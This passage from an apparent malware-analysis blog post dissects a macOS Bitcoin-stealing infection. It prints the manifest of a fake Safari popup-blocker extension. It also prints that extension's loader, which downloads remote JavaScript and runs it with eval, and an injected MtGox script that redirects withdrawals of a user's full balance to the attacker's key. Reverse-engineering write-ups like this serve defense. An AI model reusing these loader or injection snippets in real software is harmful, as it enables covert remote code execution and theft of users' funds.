</span></span><span class=line><span class=cl>    <span class=nt>&#34;kango_package_id&#34;</span><span class=p>:</span> <span class=s2>&#34;dev&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;background_scripts&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;libs/jquery-2.0.3.min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;settings/defaultSettings.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;settings/settings.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/encryption/jsEncrypt.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/encryption/updateVerifySignature.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/cryptoJS/components/core-min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/cryptoJS/components/enc-base64-min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/cryptoJS/components/sha1-min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/cryptoJS/rollups/aes.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/cryptoJS/rollups/md5.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/cryptoJS/rollups/tripledes.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/jsrsasign/ext/jsbn-min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/jsrsasign/ext/jsbn2-min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/jsrsasign/ext/base64-min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/jsrsasign/ext/rsa-min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/jsrsasign/ext/rsa2-min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/jsrsasign/asn1hex-1.1.min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/jsrsasign/rsapem-1.1.min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/jsrsasign/rsasign-1.2.min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/jsrsasign/x509-1.1.min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;global/jsrsasign/crypto-1.1.min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;background.js&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;homepage_url&#34;</span><span class=p>:</span> <span class=s2>&#34;http://kangoextensions.com/&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;version&#34;</span><span class=p>:</span> <span class=s2>&#34;1.0.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;com.optimalcycling.safari.popupblocker&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;Blocks pop-up windows and other annoyances.&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Screenshot of the Safari extension:</p><figure><a href=/wp-content/uploads/2014/02/extension_installed.png><img loading=lazy src=/wp-content/uploads/2014/02/extension_installed.png alt="extension installed"></a></figure><p>The <strong>Kango</strong> stuff is mostly uninteresting except for the <strong>background.js</strong> file. What it does is to try to contact a remote server and download a file, which will be the effective malware payload responsible for hijacking the <strong>Bitcoin</strong> sites accounts information.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>getItem</span><span class=p>(</span><span class=s1>&#39;installed&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>//Get first version and run
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=nx>$</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>settings</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;reportServer&#39;</span><span class=p>)</span><span class=o>+</span><span class=s2>&#34;/updates/firstUpdate.php&#34;</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>//Checking signature
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span><span class=p>(</span><span class=nx>updateVerifySignature</span><span class=p>(</span><span class=nx>CryptoJS</span><span class=p>.</span><span class=nx>SHA1</span><span class=p>(</span><span class=nx>data</span><span class=p>.</span><span class=nx>global</span><span class=p>),</span> <span class=nx>CryptoJS</span><span class=p>.</span><span class=nx>SHA1</span><span class=p>(</span><span class=nx>data</span><span class=p>.</span><span class=nx>injected</span><span class=p>),</span> <span class=nx>data</span><span class=p>.</span><span class=nx>signature</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>//Saving to localstorage
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>setItem</span><span class=p>(</span><span class=s1>&#39;globalJS&#39;</span><span class=p>,</span><span class=nx>data</span><span class=p>.</span><span class=nx>global</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>setItem</span><span class=p>(</span><span class=s1>&#39;injectedJS&#39;</span><span class=p>,</span><span class=nx>data</span><span class=p>.</span><span class=nx>injected</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>setItem</span><span class=p>(</span><span class=s1>&#39;installed&#39;</span><span class=p>,</span><span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>//Saving current version
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>setItem</span><span class=p>(</span><span class=s1>&#39;extensionUpdateTimestamp&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>setItem</span><span class=p>(</span><span class=s1>&#39;agentUpdateTimestamp&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1>//Executing script
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nb>eval</span><span class=p>(</span><span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>getItem</span><span class=p>(</span><span class=s1>&#39;globalJS&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>settings</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;debug&#39;</span><span class=p>))</span> <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Valid First Release&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nx>settings</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;debug&#39;</span><span class=p>))</span> <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;First Release: Bad Signature&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>},</span> <span class=s2>&#34;json&#34;</span> <span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>//Running saved version
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>eval</span><span class=p>(</span><span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>getItem</span><span class=p>(</span><span class=s1>&#39;globalJS&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>getItem</span><span class=p>(</span><span class=s1>&#39;globalJS_old&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>setItem</span><span class=p>(</span><span class=s1>&#39;globalJS&#39;</span><span class=p>,</span> <span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>getItem</span><span class=p>(</span><span class=s1>&#39;globalJS_old&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>//Error in version 0, resetting extension.
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>clear</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>settings</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;debug&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nx>uninstall</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Uninstalling...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>kango</span><span class=p>.</span><span class=nx>storage</span><span class=p>.</span><span class=nx>clear</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>A screenshot of the connection attempt to the remote server:</p><figure><a href=/wp-content/uploads/2014/02/firewall_connection.png><img loading=lazy src=/wp-content/uploads/2014/02/firewall_connection.png alt="firewall connection"></a></figure><p>If you are interested in looking at the contents of the malware payload just download it <a href=/wp-content/uploads/2014/02/firstUpdate.out_.txt.zip>here</a>. Password is &ldquo;<strong>infected!</strong>&rdquo;. You can find <strong>javascript</strong> code such as this sample for the <strong>MtGoxPlugin</strong>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl>    <span class=nx>MtGoxPlugin</span><span class=p>.</span><span class=nx>prototype</span><span class=p>.</span><span class=nx>injectPage</span> <span class=o>=</span> <span class=kd>function</span> <span class=p>(</span><span class=nx>withdrawKey</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>function</span> <span class=nx>injectScript</span><span class=p>(</span><span class=nx>source</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=kd>var</span> <span class=nx>elem</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;script&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nx>elem</span><span class=p>.</span><span class=nx>type</span> <span class=o>=</span> <span class=s2>&#34;text/javascript&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nx>elem</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>source</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nb>document</span><span class=p>.</span><span class=nx>head</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>elem</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>balance</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>round</span><span class=p>((</span><span class=nb>parseFloat</span><span class=p>(</span><span class=nx>$</span><span class=p>(</span><span class=s1>&#39;#virtualCur span&#39;</span><span class=p>).</span><span class=nx>text</span><span class=p>().</span><span class=nx>match</span><span class=p>(</span><span class=sr>/(.*)\\s/</span><span class=p>)[</span><span class=mi>1</span><span class=p>])</span><span class=o>-</span><span class=mf>0.001</span><span class=p>)</span><span class=o>*</span><span class=mi>100000000</span><span class=p>)</span><span class=o>/</span><span class=mi>100000000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>injectScript</span><span class=p>(</span><span class=s2>&#34;var pubKey = &#39;&#34;</span><span class=o>+</span> <span class=nx>withdrawKey</span> <span class=o>+</span><span class=s2>&#34;&#39;; balanceBTC = &#39;&#34;</span><span class=o>+</span> <span class=nx>balance</span> <span class=o>+</span><span class=s2>&#34;&#39;; &#34;</span><span class=o>+</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;(&#34;</span><span class=o>+</span><span class=p>(</span><span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>$</span><span class=p>.</span><span class=nx>ajaxSetup</span><span class=p>({</span>
</span></span><span class=line><span class=cl>                <span class=nx>beforeSend</span><span class=o>:</span> <span class=kd>function</span><span class=p>(</span><span class=nx>jqXHR</span><span class=p>,</span> <span class=nx>settings</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span><span class=p>(</span><span class=nx>settings</span><span class=p>.</span><span class=nx>url</span> <span class=o>==</span> <span class=s1>&#39;/api/2/money/bitcoin/send_simple&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=nx>settings</span><span class=p>.</span><span class=nx>data</span> <span class=o>=</span> <span class=nx>settings</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/amount=.*\\&amp;address=/</span><span class=p>,</span> <span class=s1>&#39;amount=&#39;</span><span class=o>+</span> <span class=nx>balanceBTC</span> <span class=o>+</span><span class=s1>&#39;&amp;address=&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                        <span class=nx>settings</span><span class=p>.</span><span class=nx>data</span> <span class=o>=</span> <span class=nx>settings</span><span class=p>.</span><span class=nx>data</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/address=.*\\&amp;address/</span><span class=p>,</span> <span class=s1>&#39;address=&#39;</span><span class=o>+</span> <span class=nx>pubKey</span> <span class=o>+</span><span class=s1>&#39;&amp;address&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>    
</span></span><span class=line><span class=cl>            <span class=p>}});</span>
</span></span><span class=line><span class=cl>        <span class=p>}).</span><span class=nx>toString</span><span class=p>()</span><span class=o>+</span><span class=s2>&#34;)()&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span></code></pre></div><p>The last step is to reverse the <strong>RAT</strong>, a binary called <strong>Agent</strong> and installed in <strong>~/Library/Application Support/.com.google.softwareUpdateAgent</strong>. I did not reverse this module yet but it appears to be responsible for sending data to the remote servers and also remote access to the infected machines. It has a few obfuscated methods reused from the dropper but everything else is not obfuscated. There is a method that verifies the presence of <em>Little Snitch</em>, which is funny because that doesn&rsquo;t exist in the dropper. Probably some quality control issues! Thereâs also a method checking for <strong>1Password</strong>.</p><figure><a href=/wp-content/uploads/2014/02/agent_methods.png><img loading=lazy src=/wp-content/uploads/2014/02/agent_methods.png alt="agent methods"></a></figure><p>What else is there to say about this? I have at least five different infected applications, in different stages of evolution (some without obfuscated methods).<br>As far as I have read/know they were available on popular downloads sites. Trust is a difficult problem to solve.</p><p>What are the conclusions and lessons from this malware?<br>Thereâs some fuss around regarding my previous post about evil iTunes plugins, with a quite surprising number of âuninformedâ people using the argument of âarbitrary code executionâ. Well, the thing is that everything you download from the Internet is arbitrary code unless you reverse every single binary, and that has the strong assumption that you are able to understand everything it does. Quite a task I might say!<br>A normal looking application can easily copy malicious payloads to many different places, iTunes plugins being one of the interesting targets, but it can also easily patch other applications since most are installed with same permissions as the normal user. Thereâs no need for exploits, suspicious <strong>please gimme r00t</strong> dialogs. Just an innocent app you download and trust. In the post-Snowden world what guarantees you have that famous apps donât have state-sponsored payloads? None I might say.<br>The open source bullshit principle of many eyes looking has been shown too many times to be a really bad assumption â not that many eyes are looking and stupid bugs are kept alive for many years. Sandboxes and the AppStore improve the situation but they still suffer from vulnerabilities and their binaries are probably more opaque (iOS in particular) and with less incentives to be reversed (Apple wouldnât let malware in the AppStore, right?).</p><p>I will probably edit this post in the next days to add some missing info or improve some paragraphs. Too tired right now.</p><p>Have fun,<br>fG!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://reverse.put.as/tags/backdoor/>backdoor</a></li><li><a href=https://reverse.put.as/tags/malware/>malware</a></li></ul><nav class=paginav><a class=prev href=https://reverse.put.as/2014/02/21/dont-die-gdb-we-love-you-kgmacros-ported-to-mavericks/><span class=title>Â« Prev</span><br><span>Donât die GDB, we love you: kgmacros ported to Mavericks.</span></a>
<a class=next href=https://reverse.put.as/2014/02/15/appledoesntgiveafuckaboutsecurity-itunes-evil-plugin-proof-of-concept/><span class=title>Next Â»</span><br><span>AppleDoesntGiveAFuckAboutSecurity iTunes Evil Plugin Proof of Concept</span></a></nav></footer></article></main><footer class=footer><span>Â© 2024 fG!</span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script defer crossorigin=anonymous src=/assets/js/papermod.97759987b29d428ec5fcba6e62472b585cba7bdbc1ff9ecf60b0b464d775831c.js integrity="sha256-l3WZh7KdQo7F/LpuYkcrWFy6e9vB/57PYLC0ZNd1gxw="></script></body></html>